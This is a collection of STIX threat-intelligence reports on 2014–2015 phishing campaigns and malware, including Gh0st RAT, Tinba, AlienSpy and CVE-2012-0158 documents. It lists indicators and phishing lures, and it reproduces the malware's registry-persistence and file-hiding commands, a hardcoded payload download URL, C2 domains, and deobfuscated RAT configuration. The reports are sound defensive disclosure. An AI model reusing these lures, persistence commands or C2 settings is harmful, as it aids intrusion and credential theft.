stix:STIX_Header.stix:Title: Pleasantly Surprised Themed Phishing Email
stix:STIX_Header.stix:Description: On 7 April 2015, a phishing email was sent from an individual webmail account to several email recipients. The email contained the subject "Pleasantly surprised" and two malicious files named Pleasantly surprised.zip(MD5:76f5dc448aa1d63ec98d17c6dfea853d) and Pleasantly surprised.Exe(MD5:9f139181df7fbcefc6a53dbf5d274087). If successfully installed, the malware performs a DNS query for www.meitanjiaoyiwang.com.

stix:Indicator.indicator:Description:
There was no information in the email body.
----Begin Email Header---- Received: from [REDACTED] ([unix socket]) by [REDACTED] Tue, 07 Apr 2015 06:10:50 -0700 X-Sieve: CMU Sieve 2.3 Message-ID: <2047821937.8215062.1428412231047.JavaMail.zimbra@comcast.net> In-Reply-To: <1284643147.8214043.1428412175824.JavaMail.zimbra@comcast.net> Subject: Pleasantly surprised MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="----=_Part_8215058_295842760.1428412231030" X-Originating-IP: [::ffff:174.139.57.178] X-Mailer: Zimbra 8.0.7_GA_6031 (ZimbraWebClient - GC31 (Win)/8.0.7_GA_6031) Thread-Topic: Pleasantly surprised Thread-Index: KwWp8MmTaLkGMwCpfg1w3dkhOaAKmQ== DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=comcast.net; s=q20140121; t=1428412233; bh=GpdBqAmwCdN9ta7HTQbyuPREaJ3QMSvlFAT3guI8CwM=; h=Received:Received:Date:From:To:Message-ID:Subject:MIME-Version: Content-Type; b=ezXuAEX/A/I3BJtMi6wtjNjBTYBlF6FGszYLJmG2DLhUZFgooT4NbMqCrjSC3CPul A0OmetfN1L6i8H9X9XhYYggVrB2C+QqCxwoGQxAnc2gInatpBnqZFkDuPdxPp/P2/T RYDZlYaSwmtHrHPdZooO3ihr3C0AKeXkr4o7w/wT3vKnnKSNLpuX6s5p6q8fKUokpX hC9v3+xUMh9gx5VTiX7rqDDDx1QfDqpD8+fByGLuDT8aKJ1HKtOsrX0XM0Dj7PlDHS 08KKC3DxZi5/fiqhxJrXIwgg1ee7TrA2oWhdDAEnzgq4riKRsTkE9BZ5ugCmulzjKr 7I8qTtuOrRTAA== X-TM-AS-MML: disable X-TM-AS-ERS: 96.114.154.171-127.9.0.1 X-TM-AS-Product-Ver: IMSS-7.1.0.1734-7.5.0.1018-21454.006 X-TM-AS-Result: No--1.262-10.0-31-10 X-imss-scan-details: No--1.262-10.0-31-10;No--1.262-4.5-31-10;No--1.262-5.0-31-10 X-TM-AS-Result-Xfilter: Match text exemption rules:No X-TMASE-MatchedRID: aQCDbRrabz8pxYXpUKgHt5Kjwcj8fgyJD3IsBuvOV4ExvD5MtK5hj/H0 dKTzfvho6QigdfhQUnEDBjEXVCnHtYRrPRzYTqwuOX/V8P8ail2cIZLVZAQa0ChAWqVoZCeF2tZ NvGBpXeLx8pzV5Pi37q9qwExAVIsfAHuuW/70Ht0+RNJUrCWd+YyVYQyFpspCanE1Ybb9x4Wvcj kjduZ5fsCnvGCfq0iQWEIcw96wY7fN+eF0NKg8Sbx4znboRX2vmtcpH7FIcZUfCYWCOsYx04QwG EEsujT01i3AVD8v6zIHDeTFsT3fhQ== From: 1mongo4854@comcast.net To:[REDACTED] ----END EMAIL HEADER----
This malicious attachment contains malware in a file named Pleasantly surprised.Exe (9f139181df7fbcefc6a53dbf5d274087).

This file makes the following changes to the registry and then performs a DNS query for www.meitanjiaoyiwang.com:
Creates value "NukeOnDelete=00000001" in key HKEY_LOCAL_MACHINE\software\microsoft\Windows\CurrentVersion\Explorer\BitBucket "NukeOnDelete" is known for disabling the recycle bin for a given drive.
It then creates value: "PendingFileRenameOperations=\??\C:\Windows\Temp\WinRunApp.lnk" in key HKEY_LOCAL_MACHINE\system\CurrentControlSet\Control\Session Manager The PendingFileRenameOperations activity has been seen in previous related phishing emails. It has been reported that the malware renames WinRunApp.lnk to WinUpdate.lnk in the All Users Startup folder.
The malware was observed exhibiting the following functionality: Keylogging, enabling process privileges, gathering user name information, acquiring the computer name, checking for debuggers, enumerating running processes, creating two mutexes named "DBWinMutex" and "MyKeepLive0303" and then sleeping for 43 seconds.

Once the malware is installed it performs a DNS query for meitanjiaoyiwang.com.
This domain was previously reported as being associated with many "Pleasantly surprised" themed malicious emails and with the Gh0st RAT malware. These reports are:
IB-13-10762 IB-13-10775 IB-14-10295 IB-14-10325 IB-14-10394 IB-14-10429 IB-14-10590 IB-14-10600 IB-14-10619 IB-14-10591 IB-14-10636 IB-15-10065 IB-14-10663 IB-14-10649 IB-15-10071 IB-15-10054

stix:STIX_Header.stix:Title: U.S. Government Agency Host Compromised by Sweet Orange Exploit Kit
stix:STIX_Header.stix:Description: On 13 September 2014, a U.S. Government Agency host was compromised by an unidentified actor after the host visited a tactical weapons web forum. The original source indicates that the exploit kit that was used was likely the Sweet Orange Exploit Kit.

stix:Indicator.indicator:Description:
After visiting the tactical weapons web forum site, the U.S Government Agency host was redirected to a German-registered server with IP address 87.118.127.94. The server was found to be hosting the domains "palmsprings.pulaskiammo.com" and "pallet.penstorageboxes.com". When the host was redirected from the tactical weapons forum, an exploit kit closely resembling Sweet Orange was used to download an unidentified Flash exploit and compromise the U.S Government Agency host. The successful execution of the exploit code caused the victim to download binary malware installation code. The presence of executable malware installation code confirmed that the Flash exploit had successfully breached the security of the host and that the host had been compromised.
Analysis of the binary installation code revealed that the executable, when run, contacts the domain "openisp.su". This domain was registered on 8 September 2014 and was shared by at least twelve different IP addresses. They were as follows:
IP Address Country of Registration
74.12.221.165 Canada 78.62.94.153 Latvia 109.104.172.69 Ukraine 109.254.116.68 Ukraine 141.101.11.233 Ukraine 176.8.126.213 Ukraine 213.231.60.190 Ukraine 46.119.226.231 Ukraine 46.160.100.172 Ukraine 89.209.96.153 Ukraine 93.171.78.27 Ukraine 94.231.32.32 Ukraine
The use of multiple IPs for a single domain resolution suggests that the openisp.su domain may be part of a Fast-Flux forensic countermeasure involving multiple domains and IPs which change over time.
Additional research also found that approximately 200 domain names are are associated with the IP address 87.118.127.94.
Technical descriptions of the Sweet Orange Exploit Kit: http://malware-traffic-analysis.net/2014/08/20/index.html http://malware-traffic-analysis.net/2014/08/21/index2.html http://www.invincea.com/2013/03/k-i-a-defense-contractor-website-as-a-watering-hole-sweet-orange-ek-stopped-by-invincea/ http://threatpost.com/israeli-think-tank-site-serves-sweet-orange-exploit/108119

stix:STIX_Header.stix:Title: Site Redirect Leads to Malware
stix:STIX_Header.stix:Description: On or around 23 April 2015 a user was redirected from http://www.drivingrange.com.ec/ to idee93.com which hosted the malicious file avast!.exe (MD5: 18100d9c2f3e6a37c32929ce4d0ef477). The malware called back to micros.zapto.org.

stix:Indicator.indicator:Description: The user was redirected from www.drivingrange.com.ec to this site, which hosted the malware avast!.exe (MD5: 18100d9c2f3e6a37c32929ce4d0ef477).
This malware was downloaded from idee93.com.
The malware avast!.exe (MD5: 18100d9c2f3e6a37c32929ce4d0ef477) called back to this domain.

stix:STIX_Header.stix:Title: Phishing Email with Blank Body Contains Incomplete Malicious Attachment
stix:STIX_Header.stix:Description: On 4 February 2015, a phishing email with the subject "=?UTF-8?B?bmjDom4gdmnDqm4gdGjDtG5nIHRpbg==?=" was observed. The subject is a base-64 encoded string that translates to "nhn vin thng tin". The email was sent from "phuonghoa1708@gmail.com" and included a malicious attachment, PPF_D6.doc (MD5: 7B3C797DA551BA199F2434696880DEE5), that was cut off. The malicious attachment contains code to exploit CVE-2012-0158. It also contained an embedded file that was incomplete. The file would not be successful in exploiting any system because of this, however, it did contain a domain, "dangcongsan.vn", to communicate with.

stix:Indicator.indicator:Description:
----- BEGIN EMAIL HEADER ----- EHLO mail-we0-f193.google.com MAIL FROM:<phuonghoa1708@gmail.com> SIZE=562396 RCPT TO:[REDACTED] Received: by mail-we0-f193.google.com with SMTP id k11so593523wes.0 for [REDACTED]; Wed, 04 Feb 2015 21:01:36 -0800 (PST) DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=gmail.com; s=20120113; h=mime-version:date:message-id:subject:from:to:content-type; bh=BQuFAOmYi1vn+nlB7DMfJJ7IoBJg2dYqnBOhQPRxCII=; b=skRx2U0ieu3AzkAAAW6njB9jaqEpjaT3oH7214jvMJb2rU4+KTbGj6+vH6F41gm8ES t85SH2bmGR6IXsHx56ElYxg5wh+11iF+Y8If3U8L2yNv5ynk9jXjbaGMJHAhHlecyUUf Py/PQHiTGxW1RQUyd3rZlSP+u15FGsGlcZSB2iPrsX7jOE6fvdnxzkTqZVfTJPfmaXb+ fJ+YTH08nrA6Y/r3fKrMMjOaRN627FqL3E4FOZt9azFNA7Q/HNQp2H6lyFKx4R4pj4nq mZC0LYlY/k6IKymPWEeoweELfXLUbhkQCyhxCD0A3AreOYSp/sT78GCnVbTgJea44HCV higg== MIME-Version: 1.0 X-Received: by 10.180.77.113 with SMTP id r17mr7874759wiw.8.1423112495807; Wed, 04 Feb 2015 21:01:35 -0800 (PST) Received: by 10.194.175.33 with HTTP; Wed, 4 Feb 2015 21:01:35 -0800 (PST) Date: Thu, 5 Feb 2015 12:01:35 +0700 Message-ID: <CAFcau2Dt55neACZisZOC7oK3zVHTZu9Ar47ShZZbW7=Fjm8WxA@mail.gmail.com> Subject: =?UTF-8?B?bmjDom4gdmnDqm4gdGjDtG5nIHRpbg==?= From: [REDACTED] <phuonghoa1708@gmail.com> To: [REDACTED] Content-Type: multipart/mixed; boundary=f46d043c81e4c9f5f3050e5032cf Bcc: [REDACTED] Attachments: PPF_D6.doc (379719 bytes); ----- END EMAIL HEADER -----
The body of the email was blank. A machine translation from Vietnamese of the subject of the email is "Staff/employee information/inform".
The email contained an attachment that was an incomplete file.

This is a Microsoft Word document that contains code to exploit the CVE-2012-0158 vulnerability. The file PPF_D6.doc was cut off due to unknown reasons, but it contained an embedded file that was likely a malicious implant.
The embedded file was incomplete, so it could not be dynamically executed, and only basic static analysis is possible. However, it is a PE executable file. The intended filename and hash of this file are unknown, however the PE header suggests the file should be of size 20480 bytes (20KB). The file had a static domain embedded within it. The domain was "dangcongsan.vn".

This is the domain embedded within the incomplete file. It is likely a malware callout domain. According to open sources, "dangcongsan.vn" with the IP Address 123.30.192.42 is the website for the Communist Party of Vietnam Online Newspaper.

stix:STIX_Header.stix:Title: Phishing Emails Delivers Gh0st RAT
stix:STIX_Header.stix:Description:
On 14 May 2014 a phishing email was sent from bstears@att.net with the subject "That's so exciting!" to multiple users at educational institutions, U.S. Government Agencies, private sector organizations, and individual webmail addresses. The email included the malicious attachment surprize.zip, which contained the Gh0st remote administration tool (RAT). The Gh0st RAT communicates with the domain mtjyzx.com.
The reporting source tracks this activity under the name "Lonely Warrior".

stix:Indicator.indicator:Description:
---- BEGIN EMAIL HEADER ---- Content-Type : multipart/mixed; boundary="-2076221306-984708307-1400075277=:63027" DKIM-Signature : v=1; a=rsa-sha256; c=relaxed/relaxed; d=att.net; s=s1024; t=1400075278; bh=6fQhTm2ZPTG52qV1Bz7KQWX3v8/b1u1dg5mPVOlGnnw=; h=Message-ID:Date:From:Reply-To:Subject:To:MIME-Version:Content-Type; b=Nbwi5UEOcs/icGBHAmo3onDLwV/SwqHmuEU1GhPNRJSCg+m8aA/LZ1CgbiGaJhbIE4YELkPqrjl/3cZx+XkF8wJ+izbm7McK03Mff4st0kYYJs6VTBPucPHHRQZpOw5MIsR2mgv9RM0ukpKrLMUItXfFR2vp3IrxzFC41//16Ow= Date : Wed, 14 May 2014 06:47:57 -0700 (PDT) From : [REDACTED] MIME-Version : 1.0 Message-ID : <1400075277.63027.YahooMailNeo@web181504.mail.ne1.yahoo.com> Received : from [1.86.183.63] by web181504.mail.ne1.yahoo.com via HTTP; Wed, 14 May 2014 06:47:57 PDT Reply-To : [REDACTED] Return-Path : Subject : That's so exciting! To : [REDACTED] X-Mailer : YahooMailWebService/0.8.188.663 X-Rocket-MIMEInfo : 002.001,CgEwAQEBAQ-- X-SENDER-IP : 98.138.120.54 X-SENDER-REPUTATION : 5.5 X-YMail-OSG : I8HlH2gVM1nubDRDV7oz9uUvIsIV4qNCQDmbcM6wpxZcB_S Sf.Cu11hHsosz_PcXiJkz1DSPhCRKW4A0ZSr1tCOSK9s1yn4V1SGQB3a.iY0 lTkS9nY6lhr0eqMxTp5spIaA62HKZ5pLOFg1YhD.4S_X2HdJDJ28XOnS9M7F fPiqfP.Ms0NFLTwrf9Jshr4S3hK4qUmOUo6I0DFYSuc5On7frihKSdwSDC5h NLUipvREbh1uYKsCAJDMZHYKQdrZRGgIIVs3AyFOpIIclO9olXR2ZOCsUhen _rM0GgLa6FUbg6u16hu.kwPfKilht6UXYtkZsBAppR4jMeI7oqfOeHSMyJnZ WOPOfId87bXB7opTyTksQXV7eO.kb2.sp1HXLkiiXehGEgs7VyqQ9DmaeVmT X7ZiaEGGuNRLDaWBRoHo_HQ0WyE4JYALR134KYVjTguvdkZo0Rpsv0WtFFCN EhI4Lt7RC5TGCwHZzZHhBxabGOMqGrmFCWVHHhCKeEvLRvk53CkhZyOMpoov 6EId06GSbBryxsCUXXkGWTt1ol7n.Dwi7 X-Yahoo-Newman-Id : 83579.24822.bm@omp1026.access.mail.bf1.yahoo.com X-Yahoo-Newman-Property : ymail-4 ---- END EMAIL HEADER ---- ---- BEGIN EMAIL BODY ----
---- END EMAIL BODY ---- This phishing email was also sent to what appeared to be the sender's work email address. Other recipients included individuals at the same U.S. Government Agency, educational institutions, private sector organizations, and individual webmail addresses.
This attachment contained the file suprize.EXE (MD5: 09914ECC00284F01449015DFAFAED048).

Compiled: Wed, May 14 2014, 7:23:09 - 32 Bit EXE Version: FileVersion
This file installs two additional file: a Gh0st RAT implant and a keylogger data file.
C:\Windows\system32\6to4air.dll (MD5: EEB07F4EF4391D8E1063656A23C07913)
C:\Windows\system32\akylog.dat The file hash changes as key stroke data is written to it.
This is the Gh0st RAT implant. The file name was dynamically chosen based on service names found in this registry key: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\SvcHost\netsvcs

stix:STIX_Header.stix:Title: Financial Institution Received Tinba Banking Malware
stix:STIX_Header.stix:Description: On 23 March 2015 a financial institution received and analyzed malware identified as Tiny Banker (Tinba). The Tinba file bin.exe (MD5: 53b71184a4f2a6fe5df33b40c374bfb1) can collect and send social media or other online account credentials. This instance of the malware called back to Lkycdejmfimg.com (62.213.67.125) and e-lindorff.uk (23.229.244.180).

stix:Indicator.indicator:Description:
A registry key was modified to enable persistence:
\REGISTRY\USER\S-1-5-21-344981575-398944299-1130229096-1000\Software\Microsoft\Windows\CurrentVersion\Run\"56C38E70" = C:\Users\[admin]\AppData\Roaming\56C38E70\bin.exe
These registry keys were modified to hijack a web browser:
\REGISTRY\USER\S-1-5-21-344981575-398944299-1130229096-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\"ProxyEnable" = 0x00000000 \REGISTRY\USER\S-1-5-21-344981575-398944299-1130229096-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\"AutoConfigURL"
The malware injects into multiple processes:
C:\Windows\System32\winver.exe C:\Windows\explorer.exe C:\Windows\System32\taskhost.exe C:\Windows\System32\dwm.exe C:\Program Files\Internet Explorer\iexplore.exe C:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe C:\Program Files\Microsoft Office\Office12\WINWORD.EXE C:\Program Files\Microsoft Office\Office12\POWERPNT.EXE C:\Program Files\Microsoft Office\Office14\EXCEL.EXE C:\Windows\System32\rundll32.exe
This malicious file is a banking Trojan identified as Tinba (Tiny Banker). Analysis of the configuration file for the Trojan indicates this particular instance is targeting a single financial institution based in Poland, ipko.pl. While the malware appeared to target Skype, Microsoft, Google, and Facebook user credentials, it can also use form grabbing functions and load additional malware payloads. The initial delivery mechanism for this Tinba instance is unknown, although Tinba has often been distributed through the Andromeda loader, which in turn is commonly distributed through malicious spam campaigns.
Tinba communicates with a C2 site using a Domain Generation Algorithm (DGA). In this incident, Tinba called back to Lkycdejmfimg.com (62.213.67.125) then e-lindorff.uk (23.229.244.180).

This domain resolved to IP 62.213.67.125 at the time of this report. Tinba C2 domains typically follow a DGA (Domain Generation Algorithm). Data sent to the C2 is encrypted with the following Public Key:
---- BEGIN PUBLIC KEY ---- MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQKCAQBx7O/djAIQL8NzFbHLySlb 2xZ8MHsIkDwz7CGSohsRpSnXMNi2zYY7Ei7Cd33zlR0I+4ZFRBZ/XEWQZir/Qiif fN5wxdjwpGMJCm1ZTQlLZFk0HmTMbMdyJDcrtgqbTmFHxwaWwt5dNvaQmFFcAr5Q wFaoAcCFukbLtBx9WOwTkTaalQtR78AsQ4Wala+WzwuttJLj9Zq8XJykHcxhqHzS kRVRLn9znMAl86ZiuA/H4SSoiwtpFkRrbXGfxJf/forZZn1l3tSaQ5sT1zmrYk0V 0Lgl15LKtn54DyL/cjc6SLHCQ0iwWwqvXyzprSmIIXXJ+kgTSNsAJsZQ0epfn+ah AgMBAAE= ---- END PUBLIC KEY ----

At the time of this report, this domain resolved to IP 23.229.244.180.
This specific URI is the hosting site for an Automated Transaction System (ATS) panel associated with this Tinba instance. According to available WHOIS information, the relatively new domain was registered through a public company on 09 March 2015 and hosted from a US Data Center.
According to the report, the panel will reply with one of the following responses:
answer = {p1:'"',p2:'"',p3:'"',p4:'"',p5:'"',sta tus:"OFF",link:"ON"}

stix:STIX_Header.stix:Title: Authorisation Letter Themed Phishing Email Targets Government Department Employees
stix:STIX_Header.stix:Description: On 30 October 2014, a U.S. government department reported that two email accounts were targeted using emails with the subject line "Authorisation Letter". The emails were sent from r.ismail@alerthr.com and carried a malicious attachment "Scan-141027-0004.doc". The malicious attachment contained shellcode for an RTF related exploit, and code to download a malicious file. The download attempts were via HTTP to destination TCP port 80, to a hardcoded URL: http:///189.226.87.150/~soaresem/.sql/skelewu.exe

stix:Indicator.indicator:Description:
----- BEGIN EMAIL HEADER ----- Subject: AUTHORISATION LETTER From: ismail <r.ismail@alerthr.com>; To: [REDACTED]; Date: Thu Oct 30 04:21:23 GMT 2014 Received: from localhost (localhost [127.0.0.1])by mail.rsup-perkebunan.co.id (Postfix) with ESMTP id [REDACTED]; Thu, 30 Oct 2014 11:14:03 +0000 (UTC) X-Virus-Scanned: amavisd-new at rsup-perkebunan.co.id Received: from mail.rsup-perkebunan.co.id ([127.0.0.1])by localhost (mail.rsup-perkebunan.co.id [127.0.0.1]) (amavisd-new, port 10024)with ESMTP id EHXUQVovsmrc for [REDACTED];Thu, 30 Oct 2014 11:14:03 +0000 (UTC) Received: from salesadmin (182.Red-80-24-205.staticIP.rima-tde.net [80.24.205.182])by mail.rsup-perkebunan.co.id (Postfix) with ESMTPA id 2C2BA1807D0for [REDACTED]; Thu, 30 Oct 2014 11:13:51 +0000 (UTC) Content-Type: multipart/mixed; boundary="2YRJkEFU3K=_erafoovuK8c4dckiKfhLGU0" MIME-Version: 1.0 Message-Id: <20141030111352.2C2BA1807D0@mail.rsup-perkebunan.co.id> Attachments: Scan-141027-0004.doc (40896 bytes); ----- END EMAIL HEADER -----
----- BEGIN EMAIL BODY----- Hello,
Please find attached authorization letter for your reference. Kind regards, Ismail ----- END EMAIL BODY-----

This is a trojanized Rich Text File (RTF) with a .doc file extension and default language settings for Russian (Cyrillic) that is opened by MS Word. When opened, the file runs an ActiveX OCX and Shellcode ROP exploit (see NIST CVE-2012-0158). No additional files are installed by this RTF.
Instead, the RTF contains a file downloader; which will retrieve a file from the hardcoded IP address 189.226.87.150 by performing an HTTP (destination) port 80 GET request for the file "/~soaresem/.sql/skelewu.exe". Once downloaded, skelewu.exe is renamed and moved to the file system.exe in the user's temp directory and launched.
If the RTF exploit is successful, a file is retrieved from the hardcoded IP address 189.226.87.150 by performing an HTTP (destination) port 80 GET request for the file "/~soaresem/.sql/skelewu.exe".

stix:STIX_Header.stix:Title: Spear Phishing Email with Changed Email Theme Contains Malicious Link
stix:STIX_Header.stix:Description: On 18 March 2015, a U.S. Government agency received a spear-phishing email sent from a spoofed sender with the subject "my new email address!" The email included a malicious link to the domain pics.toprivatespace.net

stix:Indicator.indicator:Description:
An HTML image tag will be requested automatically when the email is viewed in HTML mode and likely used to notify the attacker if a targeted individual viewed the email.
---START EMAIL BODY---- All group members, This is [REDACTED] I just want to inform you that I changed my email address. You can update with this new one. Refer to http://pics.toprivatespace.net/photos/group/20157736.php?id=[UNIQUE 5 DIGIT NUMBER] for the photo of last gathering. Wish you have a good day! [REDACTED] ---END EMAIL BODY----

This link will direct the intended recipient to a malicious file, exploit, or credential harvester. The number at the end of the link may vary depending on the target. The link likely connects to a malicious website.
The domain pics.toprivatespace.net was previously reported in IB-15-10127.

stix:STIX_Header.stix:Title: Spear Phishing Email with Payment Advice Theme Contains AlienSpy RAT
stix:STIX_Header.stix:Description:
Between 11 and 12 April 2015 at least two U.S. Government email addresses were targeted by two different spear-phishing emails that contained the AlienSpy remote administration tool (RAT). One was from dey@eskayyarntex.com with the subject "Payment Advice - Advice Ref:[G410398732] / Priority payment /Customer Ref:[498800000]" and the malicious attachment hsbc tt.jar (MD5: E76742ABA90C0A176C9E4070DB5D2B61). This email was made to appear from the legitimate company HSBC.
The other email was from Rachel.T@groupmail.com with the subject "RFQ 004100" and the malicious attachment RFQ#044.jar (MD5: 9D745E6CFA43E4C7DDB12BE5D2F0C468). This email was made to appear from the legitimate UAE business German Gulf.
Upon successful execution of the malware, it makes changes to the registry, checks for virtual machines (VMs) and antivirus (AV), and then sends GET requests to dsiminski.no-ip.org (5.254.106.196) and mega5checker.mooo.com (5.254.106.253).

stix:Indicator.indicator:Description:
----- START EMAIL HEADER 1----- EHLO mail2.eqx.gridhost.co.uk MAIL FROM:<dey@eskayyarntex.com> SIZE=92322 RCPT TO:[REDACTED] DATA Received: from [95.142.156.11] (helo=webmail.gridhost.co.uk) by mail2.eqx.gridhost.co.uk with esmtpa (Exim 4.72) (envelope-from <dey@eskayyarntex.com>) id 1YhNs1-0005vw-Ku; Sun, 12 Apr 2015 20:48:41 +0100 MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="=_b2903bdfe83f438b2b7186a04395145c" Date: Sun, 12 Apr 2015 20:48:41 +0100 From: HSBC <dey@eskayyarntex.com> To: undisclosed-recipients:; Subject: Payment Advice - Advice Ref:[G410398732] / Priority payment / Customer Ref:[498800000] Return-Receipt-To: HSBC <dey@eskayyarntex.com> Disposition-Notification-To: HSBC <dey@eskayyarntex.com> Message-ID: <625e6df577c44b5b2c9539726b2653b1@eskayyarntex.com> X-Sender: dey@eskayyarntex.com User-Agent: Roundcube Webmail/0.9.0 X-Gridhost-Auth2: dey@eskayyarntex.com ----- END EMAIL HEADER 1 ----- ----- START EMAIL BODY 1 ----- Dear Sir/Madam, The attached payment advice is issued at the request of our customer. The advice is for your reference only. Yours faithfully, Global Payments and Cash Management HSBC ----- END EMAIL BODY 1 -----
HSBC is a British multinational banking and financial services company headquartered in London, England, United Kingdom. It is the world's third largest bank by assets, according to open source reporting.

EmailMessageObj:Header.EmailMessageObj:Subject: Payment Advice - Advice Ref:[G410398732] / Priority payment / Customer Ref:[498800000]

stix:Indicator.indicator:Description:
This .jar file is obfuscated with Allatori, a Java obfuscator and contains the AlienSpy RAT. The file "hsbc tt.jar" is executed with the following command: "java -jar" "C:\Documents and Settings\[USER]\Desktop\hsbc tt.jar"
The following command is run:
xcopy "C:\Program Files\Java\jre6" "C:\Documents and Settings\[USER]\9qLK6xx7oz\" /e,
This copies directory "C:\Program Files\Java\jre6" to "C:\Documents and Settings\[USER]\9qLK6xx7oz\".
The malware executes the following commands to hide the files and folder: attrib +h "C:\Documents and Settings\[USER]\9qLK6xx7oz\*.*" attrib +h" "C:\Documents and Settings\[USER]\9qLK6xx7oz"
The following file is written: "C:\Documents and Settings\[USER]\7eSeQqn5HqU.tmp"
The malware makes the following changes to the key registry: "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v z7vhFWZxHH /t REG_SZ /d "\"C:\Documents and Settings\[USER]\9qLK6xx7oz\bin\javaw.exe\" -jar \"C:\Documents and Settings\[USER]\Application Data\9qLK6xx7oz\MXpO16jOgZ.fppwJ\"" /f"
The following registry key is deleted using the following command: "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v z7vhFWZxHH /f"
The following file is written: "C:\Documents and Settings\[USER]\Application Data\9qLK6xx7oz\MXpO16jOgZ.fppwJ"
This is a copy of "hsbc tt,jar". Then, "C:\Documents and Settings\[USER]\7eSeQqn5HqU.tmp" is deleted.
The malware executes the following commands to hide the files and folder: attrib +h "C:\Documents and Settings\[USER]\Application Data\9qLK6xx7oz" attrib +h "C:\Documents and Settings\[USER]\Application Data\9qLK6xx7oz\*.*"
The malware launches a new process with the command: "C:\Documents and Settings\[USER]\9qLK6xx7oz\bin\javaw.exe" -jar "C:\Documents and Settings\[USER]\Application Data\9qLK6xx7oz\MXpO16jOgZ.fppwJ"
This new process performs a DNS query to dsiminski.no-ip.org and attempts to connect to port 1977. If the connection is successful, it sends data.

This is a malicious XML file that contains malware configuration settings extracted from hsbc tt.jar (MD5: E76742ABA90C0A176C9E4070DB5D2B61). The deobfuscated contents of the file are:
--------- <?xml version="1.0" encoding="UTF-8" standalone="no"?> <!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd"> <properties> <comment>Java Software</comment> <entry key="DNS">dsiminski.no-ip.org</entry> <entry key="PORT">1977</entry> <entry key="JAR_EXTENSION">fppwJ</entry> <entry key="JAR_FOLDER">9qLK6xx7oz</entry> <entry key="INSTALL_TIME">2000</entry> <entry key="JAR_REGISTRY">z7vhFWZxHH</entry> <entry key="RECONNECTION_TIME">2000</entry> <entry key="MUTEX">7eSeQqn5HqU</entry> <entry key="VBOX">false</entry> <entry key="NICKNAME">chiji</entry> <entry key="VMWARE">false</entry> <entry key="CONNECTION_TIME">2000</entry> <entry key="PLUGIN_FOLDER">N3uC5YtcWT</entry> <entry key="INSTALL">true</entry> <entry key="JAR_NAME">MXpO16jOgZ</entry> <entry key="PLUGIN_EXTENSION">vLxQo</entry> </properties> ----------

----- START EMAIL HEADER 2 ----- EHLO server.f7trading.com MAIL FROM:<Rachel.T@groupmail.com> SIZE=183831 RCPT TO;[REDACTED] DATA Received: from [172.245.45.49] (port=51370 helo=cf-173-245-48-119.cloudflare.com) by server.f7trading.com with esmtpsa (TLSv1:DHE-RSA-AES256-SHA:256) (Exim 4.85) (envelope-from <Rachel.T@groupmail.com>) id 1Yh1I5-0005aZ-2m for [REDACTED]; Date: Sat, 11 Apr 2015 15:42:06 -0400 From: [REDACTED] Rachel.T@groupmail.com To: [REDACTED] Content-Type: multipart/mixed; boundary="jmG6Td=_cfYpXEiMKpNUun5q4pAZtDMCoF" Subject: RFQ 004100 ----- END EMAIL HEADER 2----- ----- START EMAIL BODY 2 ----- Pls, Kindly request to send me your best quotation for 1440 psi 42"X10" as attached drawing & full Specification list.
Looking forward to your prompt reply. Best Regards, [REDACTED] ************************************************************************************** This email (and attachments if any) is intended only for the use of the individual or entity to which it is addressed, and may contain information that is confidential or privileged and exempt from disclosure under applicable law. If the reader of this email is not the intended recipient, or the employee or agent responsible for delivering this message to the intended recipient, you are hereby notified that any dissemination, distribution or copying of this communication is strictly prohibited. If you have received this communication in error, please notify the sender immediately by return email and destroy all copies of the email (and attachments if any). ----- END EMAIL BODY 2 -----
German-gulf is a company located in Dubai that consists of trading and engineering of heavy equipment and construction products and services to include oil & gas, aviation, ship building, marine engineering, and hospitality industries, according to their website.

This .jar file is obfuscated with Allatori, a Java obfuscator and contains the AlienSpy RAT. The file "RFQ#044.jar" is executed with the following command: "java -jar "C:\Documents and Settings\[USER]\Desktop\RFQ#044.jar""
The following process is created: xcopy ""C:\Program Files\Java\jre6"" ""C:\Documents and Settings\[USER]\HmCuCoeEGt\"" /e
This copies directory "C:\Program Files\Java\jre6" to "C:\Documents and Settings\[USER]\ HmCuCoeEGt \"
The malware executes the following commands, which set the hidden attribute of the files and folder: attrib +h "C:\Documents and Settings\[USER]\HmCuCoeEGt\*.*" attrib +h "C:\Documents and Settings\[USER]\HmCuCoeEGt"
The following file is written and deleted: "C:\Documents and Settings\[USER]\3Y1flC7QuSz.tmp"
The following command is run and information is created and deleted in the registry: "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v fEckgGX33k /t REG_SZ /d "\"C:\Documents and Settings\[USER]\HmCuCoeEGt\bin\javaw.exe\" -jar \"C:\Documents and Settings\[USER]\Application Data\HmCuCoeEGt\YpuOm6eCQa.f1Ktq\"" /f"
The following file is written: "C:\Documents and Settings\[USER]\Application Data\HmCuCoeEGt\YpuOm6eCQa.f1Ktq"
This is a copy of "RFQ#044.jar".
The malware executes the following commands which hides the files and folder: attrib +h "C:\Documents and Settings\[USER]\Application Data\HmCuCoeEGt" attrib +h "C:\Documents and Settings\[USER]\Application Data\HmCuCoeEGt\*.*"
The malware launches a new process with the command: "C:\Documents and Settings\[USER]\HmCuCoeEGt\bin\javaw.exe" -jar "C:\Documents and Settings\[USER]\Application Data\HmCuCoeEGt\YpuOm6eCQa.f1Ktq"
This new process executes the following command: "cmd.exe /c regedit /s C:\DOCUME~1\[USER]\LOCALS~1\Temp\TaskNetworkGathor5999777067308635012.reg"
The new process also performs a DNS query for mega5checker.mooo.com and attempts to connect to port 1030. If the connection is successful, it sends data.

This is a malicious XML file that contains malware configuration settings from the attachment RFQ#044.jar (MD5: 9D745E6CFA43E4C7DDB12BE5D2F0C468). The deobfuscated contents of the file are:
